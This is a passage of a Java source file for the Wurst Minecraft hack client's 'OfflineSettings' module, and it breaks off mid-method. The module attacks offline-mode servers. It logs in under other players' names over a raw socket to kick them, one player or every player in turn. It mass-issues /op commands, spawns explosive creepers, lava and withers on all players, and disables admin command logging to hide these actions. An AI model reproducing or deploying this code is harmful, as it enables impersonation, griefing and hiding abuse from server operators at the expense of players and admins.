/*
 * Copyright (c) 2014-2026 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.LinkedHashSet;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.DataFormatException;
import java.util.zip.Inflater;
import java.util.stream.Collectors;

import net.minecraft.SharedConstants;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.screens.ConnectScreen;
import net.minecraft.client.gui.screens.Screen;
import net.minecraft.client.multiplayer.ClientPacketListener;
import net.minecraft.client.multiplayer.PlayerInfo;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.resolver.ServerAddress;
import net.minecraft.client.player.LocalPlayer;
import net.minecraft.core.UUIDUtil;
import net.minecraft.network.chat.Component;
import net.minecraft.util.StringUtil;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.altmanager.AltManager;
import net.wurstclient.altmanager.CrackedAlt;
import net.wurstclient.altmanager.LoginManager;
import net.wurstclient.events.UpdateListener;
import net.wurstclient.hack.Hack;
import net.wurstclient.settings.ButtonSetting;
import net.wurstclient.settings.CheckboxSetting;
import net.wurstclient.settings.SliderSetting;
import net.wurstclient.settings.StringDropdownSetting;
import net.wurstclient.settings.TextFieldSetting;
import net.wurstclient.settings.SliderSetting.ValueDisplay;
import net.wurstclient.util.ChatUtils;
import net.wurstclient.util.LastServerRememberer;
import net.wurstclient.util.text.WText;

@SearchTags({"offlinesettings", "offline reconnect", "random name",
	"instant reconnect"})
public final class OfflineSettingsHack extends Hack implements UpdateListener
{
	private static final String LOGIN_REASON =
		"You logged in from another location";
	
	private static final String NAME_CHARS =
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	private static final int LOGOUT_PROBE_CONNECT_TIMEOUT_MS = 5000;
	private static final int LOGOUT_PROBE_READ_TIMEOUT_MS = 5000;
	private static final int LOGOUT_PROBE_DURATION_MS = 10000;
	private static final long AUTO_LOGOUT_COOLDOWN_MS = 5000L;
	
	private static final Method PROFILE_NAME_METHOD =
		discoverProfileNameMethod();
	private static final Method PROFILE_ID_METHOD = discoverProfileIdMethod();
	
	public static boolean isValidOfflineNameFormat(String name)
	{
		if(name == null)
			return false;
		
		return name.length() <= 16 && name.matches("[A-Za-z0-9_]+");
	}
	
	private static Method discoverProfileNameMethod()
	{
		try
		{
			Class<?> profileClass =
				Class.forName("com.mojang.authlib.GameProfile");
			Method method = profileClass.getMethod("getName");
			method.setAccessible(true);
			return method;
		}catch(Throwable t)
		{
			return null;
		}
	}
	
	private static Method discoverProfileIdMethod()
	{
		try
		{
			Class<?> profileClass =
				Class.forName("com.mojang.authlib.GameProfile");
			Method method = profileClass.getMethod("getId");
			method.setAccessible(true);
			return method;
		}catch(Throwable t)
		{
			return null;
		}
	}
	
	private final CheckboxSetting autoReconnect =
		new CheckboxSetting("Quick reconnect",
			WText.literal("Immediately reconnect when you are kicked for "
				+ "logging in elsewhere."),
			true);
	
	private final CheckboxSetting autoLogout =
		new CheckboxSetting("Auto logout",
			WText.literal(
				"Automatically re-run the logout probe whenever the selected "
					+ "player rejoins."),
			false);
	
	private final CheckboxSetting randomName =
		new CheckboxSetting("Random name on reconnect",
			WText.literal("Generate a temporary, random offline name (≤ 8 "
				+ "chars) before reconnecting."),
			false);
	
	private final CheckboxSetting showDisconnectButtons = new CheckboxSetting(
		"Show disconnect buttons",
		WText.literal(
			"Show OfflineSettings reconnect controls on the disconnect screen."),
		true);
	
	private final CheckboxSetting crackedDetection =
		new CheckboxSetting("Cracked server detection",
			WText.literal("Detect cracked servers and announce them in chat."),
			true)
		{
			@Override
			public void update()
			{
				super.update();
				updateCrackedDetectionSubscription();
			}
		};
	
	private final TextFieldSetting specifiedName =
		new TextFieldSetting("Specified name",
			WText.literal("Force reconnects to use this offline name."), "",
			s -> s.isEmpty() || isValidOfflineNameFormat(s));
	
	private final StringDropdownSetting otherPlayerName =
		new StringDropdownSetting("Player select",
			WText.literal("Pick another player's name from the last server."));
	
	private final ButtonSetting logoutButton =
		new ButtonSetting("Logout other player",
			WText.literal("Attempt to log in as the selected player in a "
				+ "background probe."),
			this::startLogoutProbe);
	
	private final ButtonSetting reconnectButton =
		new ButtonSetting("Reconnect to server",
			WText.literal(
				"Reconnect with the chosen, specified, or random name."),
			this::reconnectWithSelectedName);
	
	private final TextFieldSetting reconnectCommand =
		new TextFieldSetting("Reconnect command",
			WText.literal(
				"Command to send immediately after reconnecting (optional)."),
			"", s -> true);
	
	private final ButtonSetting reconnectCommandButton =
		new ButtonSetting("Reconnect & run command",
			WText.literal(
				"Reconnect and run the command once chat is available."),
			this::reconnectAndRunCommand);
	
	private final Random random = new Random();
	private CrackedAlt trackedAlt;
	private int playerListTicks;
	private final AtomicBoolean autoReconnectInProgress =
		new AtomicBoolean(false);
	private final AtomicBoolean autoReconnectRequested =
		new AtomicBoolean(false);
	private final AtomicBoolean logoutProbeRunning = new AtomicBoolean(false);
	private volatile ServerData pendingServer;
	private volatile boolean pendingForceRandom;
	private volatile boolean pendingAllowRandomFallback;
	private volatile String pendingReconnectCommand;
	private int reconnectCommandDelayTicks;
	private final UpdateListener crackedDetectionUpdate =
		this::runCrackedDetectionUpdate;
	private boolean crackedDetectionRegistered;
	private int crackedDetectionTicks;
	private volatile long autoLogoutLastAttempt;
	private volatile String autoLogoutTarget;
	private volatile boolean autoLogoutWaitingForLeave;
	
	// Auto logout all - cycles through every player
	private final CheckboxSetting autoLogoutAll = new CheckboxSetting(
		"Auto logout all",
		WText
			.literal("Automatically cycles through every player on the server, "
				+ "logging each one out. Ignores the current player."),
		false);
	private volatile String autoLogoutAllCurrentTarget;
	private volatile long autoLogoutAllLastAttempt;
	private volatile boolean autoLogoutAllWaitingForLeave;
	private final Set<String> autoLogoutAllProcessed = new LinkedHashSet<>();
	
	// Check OP on join
	private final CheckboxSetting checkOpOnJoin = new CheckboxSetting(
		"Check OP on join",
		WText.literal("On joining an offline server, checks if you are OP by "
			+ "detecting whether /op and /ban are available commands, "
			+ "and optionally runs the specified command."),
		false);
	private final TextFieldSetting checkOpCommand = new TextFieldSetting(
		"OP check command",
		WText.literal("Optional command to run when checking OP status on an "
			+ "offline server. Leave empty to only check via autocomplete."),
		"", s -> true);
	private boolean checkOpPending;
	private int checkOpTicks;
	
	// Reconnect as random player
	private final ButtonSetting reconnectRandomPlayerButton =
		new ButtonSetting("Reconnect as random player",
			WText.literal(
				"Reconnect to the server using a randomly chosen player name "
					+ "from the last server's player list. Won't pick the same "
					+ "player twice until all have been tried."),
			this::reconnectAsRandomPlayer);
	private final Set<String> usedRandomReconnectPlayers =
		new LinkedHashSet<>();
	
	// Bulk OP
	private final TextFieldSetting bulkOpPrefix = new TextFieldSetting(
		"Bulk OP prefix",
		WText.literal(
			"Prefix for bulk-op names (e.g., \"frog\" creates frog1, frog2, ...)."),
		"", s -> s.isEmpty() || s.matches("[A-Za-z0-9_]{0,14}"));
	private final SliderSetting bulkOpCount =
		new SliderSetting("Bulk OP count", "Number of ops to create (1-1000).",
			1, 1, 1000, 1, ValueDisplay.INTEGER);
	private final ButtonSetting bulkOpButton = new ButtonSetting("Run bulk OP",
		WText.literal("Sends /op commands for the specified prefix and count "
			+ "as fast as possible."),
		this::runBulkOpFromSettings);
	private int bulkOpIndex;
	private volatile boolean bulkOpRunning;
	private volatile String bulkOpNamePrefix;
	private volatile int bulkOpTotal;
	
	// OP Commands submenu
	private final ButtonSetting opCreeperEggCmd = new ButtonSetting(
		"Hyper Charged Creeper Egg",
		WText.literal("/give @p minecraft:creeper_spawn_egg[...] 1"),
		() -> runOpCommand(
			"/give @p minecraft:creeper_spawn_egg[minecraft:entity_data={id:\"minecraft:creeper\",powered:1b,ExplosionRadius:30b,Fuse:0s,ignited:1b}] 1"));
	private final ButtonSetting opCreeperDropCmd = new ButtonSetting(
		"Hyper Charged Creeper Drop",
		WText.literal(
			"/execute as @p at @s anchored eyes positioned ^ ^ ^5 run summon minecraft:creeper..."),
		() -> runOpCommand(
			"/execute as @p at @s anchored eyes positioned ^ ^ ^5 run summon minecraft:creeper ~ ~ ~ {powered:1b,ExplosionRadius:30b,Fuse:0s,ignited:1b}"));
	private final ButtonSetting opCreeperAllCmd = new ButtonSetting(
		"Hyper Charged Creeper @ All",
		WText.literal("/execute as @a at @s run summon minecraft:creeper..."),
		() -> runOpCommand(
			"/execute as @a at @s run summon minecraft:creeper ~ ~ ~ {powered:1b,ExplosionRadius:12b,Fuse:0s,ignited:1b}"));
	private final ButtonSetting opLavaAllCmd = new ButtonSetting(
		"Summon Lava @ All",
		WText.literal(
			"/execute as @a at @s run fill ~-8 ~25 ~-8 ~8 ~25 ~8 minecraft:lava replace air"),
		() -> runOpCommand(
			"/execute as @a at @s run fill ~-8 ~25 ~-8 ~8 ~25 ~8 minecraft:lava replace air"));
	private final ButtonSetting opWitherAllCmd = new ButtonSetting(
		"Summon Wither @ All",
		WText.literal(
			"/execute as @a at @s run summon minecraft:wither ~ ~1 ~ {...}"),
		() -> runOpCommand(
			"/execute as @a at @s run summon minecraft:wither ~ ~1 ~ {CustomName:{\"text\":\"https://cevapi.dev/\",\"color\":\"dark_red\",\"bold\":true},CustomNameVisible:1b}"));
	
	// Disable command feedback / admin logs
	private final CheckboxSetting disableCommandFeedback =
		new CheckboxSetting("Disable command feedback",
			WText.literal(
				"Temporarily disables sendCommandFeedback gamerule before "
					+ "sending any OP commands from Wurst."),
			true);
	private final CheckboxSetting disableAdminLogs =
		new CheckboxSetting("Disable admin logs",
			WText.literal(
				"Temporarily disables logAdminCommands gamerule before "
					+ "sending any OP commands from Wurst."),
			true);
	
	private final Map<String, Boolean> crackedServers =
		new ConcurrentHashMap<>();
	private final Set<String> announcedCrackedServers =
		Collections.newSetFromMap(new ConcurrentHashMap<>());
	private final UpdateListener reconnectCommandRunner = new UpdateListener()
	{
		@Override
		public void onUpdate()
		{
			tryRunPendingReconnectCommand();
		}
	};
	private boolean reconnectCommandRunnerRegistered;
	
	public OfflineSettingsHack()
	{
		super("OfflineSettings");
		setCategory(Category.TOOLS);
		addSetting(crackedDetection);
		addSetting(autoReconnect);
		addSetting(randomName);
		addSetting(showDisconnectButtons);
		addSetting(specifiedName);
		addSetting(otherPlayerName);
		addSetting(autoLogout);
		addSetting(autoLogoutAll);
		addSetting(checkOpOnJoin);
		addSetting(checkOpCommand);
		addSetting(reconnectCommand);
		addSetting(reconnectCommandButton);
		addSetting(reconnectButton);
		addSetting(reconnectRandomPlayerButton);
		addSetting(logoutButton);
		addSetting(bulkOpPrefix);
		addSetting(bulkOpCount);
		addSetting(bulkOpButton);
		addSetting(disableCommandFeedback);
		addSetting(disableAdminLogs);
		addSetting(opCreeperEggCmd);
		addSetting(opCreeperDropCmd);
		addSetting(opCreeperAllCmd);
		addSetting(opLavaAllCmd);
		addSetting(opWitherAllCmd);
		updateCrackedDetectionSubscription();
	}
	
	public boolean isAutoReconnectEnabled()
	{
		return autoReconnect.isChecked();
	}
	
	public boolean shouldShowDisconnectButtons()
	{
		return showDisconnectButtons.isChecked();
	}
	
	public void setShowDisconnectButtons(boolean enabled)
	{
		showDisconnectButtons.setChecked(enabled);
	}
	
	public void toggleAutoReconnect()
	{
		autoReconnect.setChecked(!autoReconnect.isChecked());
		if(autoReconnect.isChecked())
			reconnectWithSelectedName();
	}
	
	public void setAutoReconnectEnabled(boolean enabled)
	{
		autoReconnect.setChecked(enabled);
	}
	
	@Override
	protected void onEnable()
	{
		EVENTS.add(UpdateListener.class, this);
		updateCrackedDetectionSubscription();
	}
	
	@Override
	protected void onDisable()
	{
		EVENTS.remove(UpdateListener.class, this);
		unregisterReconnectCommandRunner();
		cleanupTemporaryAlt();
		pendingReconnectCommand = null;
		reconnectCommandDelayTicks = 0;
		clearAutoLogoutState();
		clearAutoLogoutAllState();
		bulkOpRunning = false;
		bulkOpIndex = 0;
		checkOpPending = false;
		checkOpTicks = 0;
		updateCrackedDetectionSubscription();
	}
	
	public void handleDisconnect(Component reason)
	{
		Minecraft client = Minecraft.getInstance();
		
		if(client == null || !isEnabled())
		{
			cleanupTemporaryAlt();
			autoReconnectRequested.set(false);
			pendingServer = null;
			return;
		}
		
		captureOnlinePlayers(client);
		
		if(!shouldReconnect(reason))
		{
			cleanupTemporaryAlt();
			autoReconnectRequested.set(false);
			pendingServer = null;
			return;
		}
		
		ServerData lastServer = LastServerRememberer.getLastServer();
		if(lastServer == null)
			lastServer = client.getCurrentServer();
		if(lastServer == null)
			return;
		
		pendingServer = lastServer;
		boolean preferRandom = randomName.isChecked();
		pendingForceRandom = preferRandom;
		pendingAllowRandomFallback = preferRandom;
		autoReconnectRequested.set(true);
	}
	
	public boolean consumeAutoReconnectRequest()
	{
		return autoReconnectRequested.getAndSet(false);
	}
	
	public void performAutoReconnect(Screen prevScreen)
	{
		Minecraft client = Minecraft.getInstance();
		ServerData server = pendingServer;
		
		if(server == null)
			server = LastServerRememberer.getLastServer();
		if(server == null || client == null)
			return;
		
		final ServerData targetServer = server;
		final boolean forceRandom = pendingForceRandom;
		final boolean allowRandom = pendingAllowRandomFallback;
		pendingServer = null;
		
		Screen resolvedPrev = resolvePrevScreen(prevScreen, client);
		if(resolvedPrev == null)
			resolvedPrev = client != null ? client.gui.screen() : null;
		final Screen prev = resolvedPrev;
		
		if(!autoReconnectInProgress.compareAndSet(false, true))
			return;
		
		client.execute(() -> {
			try
			{
				reconnect(client, prev, targetServer, forceRandom, allowRandom);
			}finally
			{
				autoReconnectInProgress.set(false);
			}
		});
	}
	
	public void reconnectWithRandomName()
	{
		reconnectWithRandomName(null);
	}
	
	public void reconnectWithRandomName(Screen prevScreen)
	{
		ServerData lastServer = LastServerRememberer.getLastServer();
		Minecraft client = Minecraft.getInstance();
		if(lastServer == null || client == null)
			return;
		
		final Screen prev = resolvePrevScreen(prevScreen, client);
		client.execute(() -> reconnect(client, prev, lastServer, true, true));
	}
	
	public void reconnectWithSelectedName()
	{
		reconnectWithSelectedName(null);
	}
	
	public void reconnectWithSelectedName(Screen prevScreen)
	{
		ServerData lastServer = LastServerRememberer.getLastServer();
		Minecraft client = Minecraft.getInstance();
		if(lastServer == null || client == null)
			return;
		
		boolean allowRandom = randomName.isChecked();
		final Screen prev = resolvePrevScreen(prevScreen, client);
		client.execute(
			() -> reconnect(client, prev, lastServer, false, allowRandom));
	}
	
	@Override
	public void onUpdate()
	{
		tryRunPendingReconnectCommand();
		
		// Bulk OP tick - send commands as fast as possible
		if(bulkOpRunning)
			tickBulkOp();
		
		// Auto logout all tick
		if(autoLogoutAll.isChecked() && isEnabled())
			tickAutoLogoutAll();
		
		// Check OP on join tick
		if(checkOpPending)
			tickCheckOp();
		
		if(playerListTicks-- > 0)
			return;
		
		playerListTicks = 40;
		captureOnlinePlayers(Minecraft.getInstance());
	}
	
	private boolean shouldReconnect(Component reason)
	{
		if(reason == null || !autoReconnect.isChecked())
			return false;
		
		String text = StringUtil.stripColor(reason.getString()).trim();
		return text.contains(LOGIN_REASON);
	}
	
	private void reconnect(Minecraft client, Screen prevScreen,
		ServerData server, boolean forceRandomName, boolean allowRandomFallback)
	{
		String nameToUse;
		
		if(forceRandomName)
			nameToUse = generateRandomName();
		else
			nameToUse = determineName(allowRandomFallback);
		
		if(nameToUse != null)
			applyName(nameToUse);
		else
			cleanupTemporaryAlt();
		
		startConnection(client, prevScreen, server);
	}
	
	public void reconnectWithCustomName(String name)
	{
		reconnectWithCustomName(name, null);
	}
	
	public void reconnectWithCustomName(String name, Screen prevScreen)
	{
		if(name == null)
			return;
		
		String trimmed = name.trim();
		if(trimmed.isEmpty() || !isValidOfflineNameFormat(trimmed))
			return;
		
		ServerData lastServer = LastServerRememberer.getLastServer();
		Minecraft client = Minecraft.getInstance();
		if(lastServer == null || client == null)
			return;
		
		final Screen prev = resolvePrevScreen(prevScreen, client);
		client.execute(
			() -> reconnectWithProvidedName(client, prev, lastServer, trimmed));
	}
	
	private void reconnectWithProvidedName(Minecraft client, Screen prevScreen,
		ServerData server, String providedName)
	{
		applyName(providedName);
		startConnection(client, prevScreen, server);
	}
	
	private Screen resolvePrevScreen(Screen requested, Minecraft client)
	{
		if(requested != null)
			return requested;
		
		return client != null ? client.gui.screen() : null;
	}
	
	private void startConnection(Minecraft client, Screen prevScreen,
		ServerData server)
	{
		ServerAddress address = ServerAddress.parseString(server.ip);
		Screen previous = resolvePrevScreen(prevScreen, client);
		ConnectScreen.startConnecting(previous, client, address, server, false,
			null);
	}
	
	private String determineName(boolean allowRandomFallback)
	{
		String selectedPlayer = otherPlayerName.getSelected();
		if(selectedPlayer != null && !selectedPlayer.isEmpty())
			return selectedPlayer;
		
		String customName = specifiedName.getValue();
		if(customName != null && !customName.isBlank())
			return customName;
		
		if(allowRandomFallback && randomName.isChecked())
			return generateRandomName();
		
		return null;
	}
	
	private void applyName(String name)
	{
		if(name == null || name.isEmpty())
			return;
		
		cleanupTemporaryAlt();
		AltManager altManager = WURST.getAltManager();
		
		if(!altManager.contains(name))
		{
			CrackedAlt alt = new CrackedAlt(name);
			altManager.add(alt);
			trackedAlt = alt;
		}
		
		LoginManager.changeCrackedName(name);
	}
	
	private String generateRandomName()
	{
		int length = random.nextInt(8) + 1;
		StringBuilder builder = new StringBuilder(length);
		
		for(int i = 0; i < length; i++)
			builder
				.append(NAME_CHARS.charAt(random.nextInt(NAME_CHARS.length())));
		
		return builder.toString();
	}
	
	private void cleanupTemporaryAlt()
	{
		if(trackedAlt == null)
			return;
		
		WURST.getAltManager().remove(trackedAlt);
		trackedAlt = null;
	}
	
	private void captureOnlinePlayers(Minecraft client)
	{
		if(client == null)
			return;
		
		LocalPlayer player = client.player;
		if(player == null || player.connection == null)
			return;
		
		Set<String> players = new LinkedHashSet<>();
		String self =
			client.getUser() != null ? client.getUser().getName() : "";
		
		ServerData server = getCurrentOrLastServer();
		
		for(PlayerInfo entry : player.connection.getOnlinePlayers())
		{
			String name =
				StringUtil.stripColor(extractProfileName(entry.getProfile()));
			if(name.isEmpty() || name.equalsIgnoreCase(self))
				continue;
			
			players.add(name);
		}
		
		if(player != null)
		{
			detectCrackedServerFromPlayerList(player, server);
			detectCrackedServerFromSelf(player, server);
		}
		
		Set<String> dropdownOptions = new LinkedHashSet<>(players);
		String selected = otherPlayerName.getSelected();
		if(selected != null && !selected.isEmpty()
			&& !containsIgnoreCase(dropdownOptions, selected))
			dropdownOptions.add(selected);
		
		otherPlayerName.setOptions(dropdownOptions);
		checkAutoLogout(players, server);
	}
	
	public List<String> getCapturedPlayerNames()
	{
		return otherPlayerName.getValues().stream()
			.filter(name -> name != null && !name.trim().isEmpty())
			.collect(Collectors.toList());
	}
	
	private void checkAutoLogout(Set<String> players, ServerData server)
	{
		if(!autoLogout.isChecked())
		{
			clearAutoLogoutState();
			return;
		}
		
		String selected = otherPlayerName.getSelected();
		if(selected == null || selected.isEmpty())
		{
			clearAutoLogoutState();
			return;
		}
		
		if(autoLogoutTarget == null
			|| !autoLogoutTarget.equalsIgnoreCase(selected))
		{
			autoLogoutTarget = selected;
			autoLogoutLastAttempt = 0;
			autoLogoutWaitingForLeave = false;
		}
		
		boolean isOnline =
			server != null && containsIgnoreCase(players, selected);
		if(!isOnline)
		{
			autoLogoutWaitingForLeave = false;
			autoLogoutLastAttempt = 0;
			return;
		}
		
		if(autoLogoutWaitingForLeave)
			return;
		
		long now = System.currentTimeMillis();
		if(now - autoLogoutLastAttempt < AUTO_LOGOUT_COOLDOWN_MS)
			return;
		
		if(triggerLogoutProbe(selected, server, true, true))
		{
			autoLogoutLastAttempt = now;
			autoLogoutWaitingForLeave = true;
		}
	}
	
	private void clearAutoLogoutState()
	{
		autoLogoutTarget = null;
		autoLogoutLastAttempt = 0;
		autoLogoutWaitingForLeave = false;
	}
	
	private boolean containsIgnoreCase(Iterable<String> names, String target)
	{
		if(names == null || target == null)
			return false;
		
		for(String name : names)
			if(name.equalsIgnoreCase(target))
				return true;
			
		return false;
	}
	
	private void detectCrackedServerFromPlayerList(LocalPlayer player,
		ServerData server)
	{
		if(player == null || player.connection == null
			|| !crackedDetection.isChecked())
			return;
		
		if(server == null)
			return;
		
		for(PlayerInfo entry : player.connection.getOnlinePlayers())
		{
			Object profile = entry.getProfile();
			if(profile == null)
				continue;
			
			String name = extractProfileName(profile);
			if(name.isEmpty())
				continue;
			
			UUID uuid = extractProfileUuid(profile);
			if(uuid == null)
				continue;
			
			if(UUIDUtil.createOfflinePlayerUUID(name).equals(uuid))
			{
				markServerCracked(server,
					"player " + name + " uses offline UUID");
				break;
			}
		}
	}
	
	private void detectCrackedServerFromSelf(LocalPlayer player,
		ServerData server)
	{
		if(player == null || server == null || !crackedDetection.isChecked())
			return;
		
		UUID actualUuid = player.getUUID();
		if(actualUuid == null)
			return;
		
		String name = player.getName().getString();
		if(name == null || name.isBlank())
			return;
		
		UUID offlineUuid = UUIDUtil.createOfflinePlayerUUID(name.trim());
		if(actualUuid.equals(offlineUuid))
			markServerCracked(server, "your session uses offline UUID");
	}
	
	private static String extractProfileName(Object profile)
	{
		if(profile == null)
			return "";
		
		if(PROFILE_NAME_METHOD != null)
		{
			try
			{
				return (String)PROFILE_NAME_METHOD.invoke(profile);
			}catch(Throwable ignored)
			{}
		}
		
		String asString = profile.toString();
		String marker = "name=";
		int index = asString.indexOf(marker);
		if(index >= 0)
		{
			int start = index + marker.length();
			int end = asString.indexOf(',', start);
			if(end < 0)
				end = asString.length();
			return asString.substring(start, end).trim();
		}
		
		return asString;
	}
	
	private static UUID extractProfileUuid(Object profile)
	{
		if(profile == null)
			return null;
		
		if(PROFILE_ID_METHOD != null)
		{
			try
			{
				return (UUID)PROFILE_ID_METHOD.invoke(profile);
			}catch(Throwable ignored)
			{}
		}
		
		String asString = profile.toString();
		String marker = "id=";
		int index = asString.indexOf(marker);
		if(index >= 0)
		{
			int start = index + marker.length();
			int end = asString.indexOf(',', start);
			if(end < 0)
				end = asString.length();
			try
			{
				return UUID.fromString(asString.substring(start, end).trim());
			}catch(IllegalArgumentException ignored)
			{}
		}
		
		return null;
	}
	
	private void tryRunPendingReconnectCommand()
	{
		String command = pendingReconnectCommand;
		if(command == null || command.isEmpty())
		{
			unregisterReconnectCommandRunner();
			return;
		}
		
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.getConnection() == null)
			return;
		
		LocalPlayer player = client.player;
		if(player == null || player.tickCount < 5)
			return;
		
		if(reconnectCommandDelayTicks-- > 0)
			return;
		
		if(command.startsWith("/"))
			client.getConnection().sendCommand(command.substring(1));
		else
			client.getConnection().sendChat(command);
		
		ChatUtils
			.message("[OfflineSettings] Ran reconnect command: " + command);
		pendingReconnectCommand = null;
		reconnectCommandDelayTicks = 0;
		unregisterReconnectCommandRunner();
	}
	
	public void reconnectAndRunCommand()
	{
		reconnectAndRunCommand(null);
	}
	
	public void reconnectAndRunCommand(Screen prevScreen)
	{
		String command = reconnectCommand.getValue().trim();
		if(command.isEmpty())
		{
			ChatUtils.error("OfflineSettings: command cannot be empty.");
			return;
		}
		
		queueReconnectCommand(command);
		reconnectWithSelectedName(prevScreen);
	}
	
	public void queueReconnectCommand(String command)
	{
		String trimmed = command.trim();
		if(trimmed.isEmpty())
			return;
		
		pendingReconnectCommand = trimmed;
		reconnectCommandDelayTicks = 40;
		ChatUtils
			.message("[OfflineSettings] Queued reconnect command: " + trimmed);
		registerReconnectCommandRunner();
	}
	
	private void registerReconnectCommandRunner()
	{
		if(reconnectCommandRunnerRegistered)
			return;
		
		EVENTS.add(UpdateListener.class, reconnectCommandRunner);
		reconnectCommandRunnerRegistered = true;
	}
	
	private void unregisterReconnectCommandRunner()
	{
		if(!reconnectCommandRunnerRegistered)
			return;
		
		EVENTS.remove(UpdateListener.class, reconnectCommandRunner);
		reconnectCommandRunnerRegistered = false;
	}
	
	public boolean wasLastServerCracked()
	{
		ServerData last = LastServerRememberer.getLastServer();
		if(last == null)
			return false;
		
		String key = serverKey(last);
		if(key.isEmpty())
			return false;
		
		return crackedServers.getOrDefault(key, Boolean.FALSE);
	}
	
	public void recordHandshakeEncryption(boolean encryptionUsed)
	{
		if(encryptionUsed || !crackedDetection.isChecked())
			return;
		
		ServerData server = getCurrentOrLastServer();
		if(server == null)
			return;
		
		markServerCracked(server, "login skipped encryption");
		
		// Queue OP check if enabled
		if(isEnabled() && checkOpOnJoin.isChecked())
		{
			checkOpPending = true;
			checkOpTicks = 60;
		}
	}
	
	private ServerData getCurrentOrLastServer()
	{
		Minecraft client = Minecraft.getInstance();
		if(client != null && client.getCurrentServer() != null)
			return client.getCurrentServer();
		
		return LastServerRememberer.getLastServer();
	}
	
	private String serverKey(ServerData server)
	{
		if(server == null || server.ip == null)
			return "";
		
		return server.ip.trim().toLowerCase(Locale.ROOT);
	}
	
	private void markServerCracked(ServerData server, String reason)
	{
		if(server == null || reason == null || reason.isEmpty())
			return;
		
		String key = serverKey(server);
		if(key.isEmpty())
			return;
		
		Boolean previous = crackedServers.put(key, Boolean.TRUE);
		boolean already = previous != null && previous.booleanValue();
		String announceKey = key;
		
		if(!already && crackedDetection.isChecked()
			&& announcedCrackedServers.add(announceKey))
		{
			Minecraft client = Minecraft.getInstance();
			Runnable messageTask = () -> ChatUtils
				.message("[OfflineSettings] Detected cracked server: "
					+ server.ip + " (" + reason + ").");
			if(client != null)
				client.execute(messageTask);
			else
				messageTask.run();
		}
		
	}
	
	private void runCrackedDetectionUpdate()
	{
		if(isEnabled() || !crackedDetection.isChecked())
			return;
		
		if(crackedDetectionTicks-- > 0)
			return;
		
		crackedDetectionTicks = 40;
		captureOnlinePlayers(Minecraft.getInstance());
	}
	
	private void updateCrackedDetectionSubscription()
	{
		boolean shouldListen = crackedDetection.isChecked() && !isEnabled();
		
		if(shouldListen == crackedDetectionRegistered)
			return;
		
		if(shouldListen)
		{
			EVENTS.add(UpdateListener.class, crackedDetectionUpdate);
			crackedDetectionRegistered = true;
			crackedDetectionTicks = 0;
		}else
		{
			EVENTS.remove(UpdateListener.class, crackedDetectionUpdate);
			crackedDetectionRegistered = false;
		}
	}
	
	private void startLogoutProbe()
	{
		triggerLogoutProbe(otherPlayerName.getSelected(), null, false, false);
	}
	
	private void runLogoutProbe(String host, int port, String username)
	{
		try(Socket socket = new Socket())
		{
			socket.connect(new InetSocketAddress(host, port),
				LOGOUT_PROBE_CONNECT_TIMEOUT_MS);
			socket.setSoTimeout(LOGOUT_PROBE_READ_TIMEOUT_MS);
			DataInputStream input =
				new DataInputStream(socket.getInputStream());
			OutputStream output = socket.getOutputStream();
			byte[] handshakePayload = buildHandshakePayload(host, port);
			byte[] loginPayload = buildLoginPayload(username);
			sendProbePacket(output, 0x00, handshakePayload);
			sendProbePacket(output, 0x00, loginPayload);
			long deadline =
				System.currentTimeMillis() + LOGOUT_PROBE_DURATION_MS;
			int compressionThreshold = -1;
			while(System.currentTimeMillis() < deadline)
			{
				byte[] body = readProbePacket(input, compressionThreshold);
				if(body == null)
					break;
				ByteArrayInputStream packetIn = new ByteArrayInputStream(body);
				int packetId = readVarInt(packetIn);
				byte[] payload = packetIn.readAllBytes();
				if(packetId == 0x00)
				{
					String reason =
						readString(new ByteArrayInputStream(payload));
					sendLogoutMessage(
						"Server disconnected login attempt: " + reason);
					return;
				}
				if(packetId == 0x01)
				{
					sendLogoutMessage(
						"Server requested encryption/auth information.");
					continue;
				}
				if(packetId == 0x02)
				{
					sendLogoutMessage(
						"Server accepted the login for " + username + ".");
					return;
				}
				if(packetId == 0x03)
				{
					int threshold =
						readVarInt(new ByteArrayInputStream(payload));
					compressionThreshold = threshold;
					sendLogoutMessage("Server enabled compression (threshold "
						+ threshold + ").");
					continue;
				}
				sendLogoutMessage(String.format(Locale.ROOT,
					"Unhandled login packet 0x%02X (%d bytes).", packetId,
					payload.length));
			}
			sendLogoutMessage(
				"Login probe timed out without a clear server response.");
		}catch(IOException | DataFormatException e)
		{
			sendLogoutError("Logout probe failed: " + e.getMessage());
		}
	}
	
	private boolean triggerLogoutProbe(String username, ServerData server,
		boolean silentErrors, boolean autoTriggered)
	{
		if(username == null || username.isEmpty())
		{
			if(!silentErrors)
				sendLogoutError(
					"Select another player's name before using logout.");
			return false;
		}
		
		if(server == null)
			server = getCurrentOrLastServer();
		if(server == null)
		{
			if(!silentErrors)
				sendLogoutError("No recent server to probe.");
			return false;
		}
		
		ServerAddress address = ServerAddress.parseString(server.ip);
		String host = address.getHost();
		int port = address.getPort();
		if(host == null || host.isBlank())
		{
			if(!silentErrors)
				sendLogoutError("Invalid server address.");
			return false;
		}
		
		if(!logoutProbeRunning.compareAndSet(false, true))
		{
			if(!silentErrors)
				sendLogoutError("Another logout probe is already running.");
			return false;
		}
		
		String message;
		if(autoTriggered)
			message = String.format(Locale.ROOT,
				"Auto-logging out %s on %s:%d...", username, host, port);
		else
			message = String.format(Locale.ROOT, "Probing %s:%d as %s...", host,
				port, username);
		sendLogoutMessage(message);
		
		Thread thread = new Thread(() -> {
			try
			{
